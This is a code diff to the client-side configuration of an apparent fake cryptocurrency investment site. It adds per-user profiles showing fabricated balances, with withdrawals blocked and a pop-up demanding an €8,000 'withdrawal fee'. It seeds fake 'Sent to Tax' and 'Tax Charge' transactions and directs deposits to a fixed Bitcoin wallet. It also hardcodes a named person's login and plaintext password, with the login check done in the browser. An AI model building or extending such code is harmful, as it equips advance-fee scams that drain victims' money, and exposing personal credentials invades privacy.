@@ -11,6 +11,98 @@
     initialDepositCreatedAt = new Date(2026, 5, 24).getTime();
   }
 
+  var jerryCreds = {
+    email: (env.loginEmail || "").trim(),
+    password: env.loginPassword || "",
+    username: (env.loginUsername || "").trim().toLowerCase()
+  };
+
+  var profiles = [
+    {
+      id: "jerry",
+      displayName: displayName,
+      username: jerryCreds.username || "",
+      email: jerryCreds.email,
+      password: jerryCreds.password,
+      balanceUsd: balance,
+      currency: "USD",
+      currencyLabel: "USD",
+      asset: "BTC",
+      stable: false,
+      withdrawalsBlocked: true,
+      depositsBlocked: false,
+      withdrawModalBody: "Withdrawals are currently unavailable on your account. Please contact support for assistance.",
+      withdrawFeeAmount: null,
+      withdrawFeeCurrency: null,
+      initialDeposit: {
+        id: "initial-deposit",
+        amountUsd: balance,
+        date: initialDepositDate,
+        createdAt: initialDepositCreatedAt,
+        type: "Deposit",
+        asset: "BTC",
+        status: "Completed"
+      }
+    },
+    {
+      id: "lawson",
+      displayName: "Lawson Spedding",
+      username: "lawsonspedding",
+      email: "lawsonspedding",
+      password: "LawsonSpedding",
+      // 361,015.00 − 8,000 − 8,000 (tax entries)
+      balanceUsd: 345015,
+      currency: "USDT",
+      currencyLabel: "USDT",
+      asset: "USDT",
+      stable: true,
+      stateVersion: "tax-v2",
+      withdrawalsBlocked: true,
+      depositsBlocked: true,
+      withdrawModalTitle: "Withdrawal Fee",
+      withdrawModalBody: "Withdrawal fee is €8,000.",
+      withdrawFeeAmount: 8000,
+      withdrawFeeCurrency: "EUR",
+      depositModalTitle: "Deposits Unavailable",
+      depositModalBody: "Deposits are currently unavailable on your account. Please contact support for assistance.",
+      initialDeposit: {
+        id: "initial-deposit",
+        amountUsd: 361015,
+        date: "23/07/2026",
+        createdAt: new Date(2026, 6, 23).getTime(),
+        type: "Deposit",
+        asset: "USDT",
+        status: "Completed"
+      },
+      seedHistory: [
+        {
+          id: "tax-sent",
+          seed: true,
+          date: "23/07/2026",
+          createdAt: new Date(2026, 6, 23, 12, 0, 0).getTime(),
+          completesAt: new Date(2026, 6, 23, 12, 0, 0).getTime(),
+          amountUsd: 8000,
+          type: "Sent to Tax",
+          asset: "USDT",
+          amount: "-8,000.00 USDT",
+          status: "Completed"
+        },
+        {
+          id: "tax-charge",
+          seed: true,
+          date: "23/07/2026",
+          createdAt: new Date(2026, 6, 23, 12, 30, 0).getTime(),
+          completesAt: new Date(2026, 6, 23, 12, 30, 0).getTime(),
+          amountUsd: 8000,
+          type: "Tax Charge",
+          asset: "USDT",
+          amount: "-8,000.00 USDT",
+          status: "Completed"
+        }
+      ]
+    }
+  ];
+
   window.SITE = {
     platformName: platformName,
     displayName: displayName,
@@ -25,19 +117,12 @@
     platformWallet: env.platformWallet || "bc1qa348fll9sh34h8gxux8dwfu4ygmwpe7v4nmyz2",
     withdrawalFeeUsd: Number(env.withdrawalFeeUsd) || 500,
     withdrawalsBlocked: env.withdrawalsBlocked !== false,
-    initialDeposit: {
-      id: "initial-deposit",
-      amountUsd: balance,
-      date: initialDepositDate,
-      createdAt: initialDepositCreatedAt,
-      type: "Deposit",
-      asset: "BTC",
-      status: "Completed"
-    },
+    initialDeposit: profiles[0].initialDeposit,
     credentials: {
-      email: env.loginEmail || "",
-      password: env.loginPassword || ""
+      email: jerryCreds.email,
+      password: jerryCreds.password
     },
+    profiles: profiles,
     images: {
       btc: "/assets/icons/btc.svg",
       btcPng: "/assets/icons/btc.png",
@@ -46,8 +131,28 @@
       favicon: "/assets/favicon.svg"
     }
   };
-  Object.freeze(window.SITE);
-  Object.freeze(window.SITE.initialDeposit);
-  Object.freeze(window.SITE.credentials);
+
+  window.SITE.getProfileById = function (id) {
+    var list = window.SITE.profiles || [];
+    for (var i = 0; i < list.length; i++) {
+      if (list[i].id === id) return list[i];
+    }
+    return list[0] || null;
+  };
+
+  window.SITE.findProfile = function (login, password) {
+    var key = (login || "").trim().toLowerCase();
+    var pass = password || "";
+    var list = window.SITE.profiles || [];
+    for (var i = 0; i < list.length; i++) {
+      var p = list[i];
+      var email = (p.email || "").trim().toLowerCase();
+      var username = (p.username || "").trim().toLowerCase();
+      if (!pass || pass !== p.password) continue;
+      if (key && (key === email || (username && key === username))) return p;
+    }
+    return null;
+  };
+
   Object.freeze(window.SITE.images);
 })();
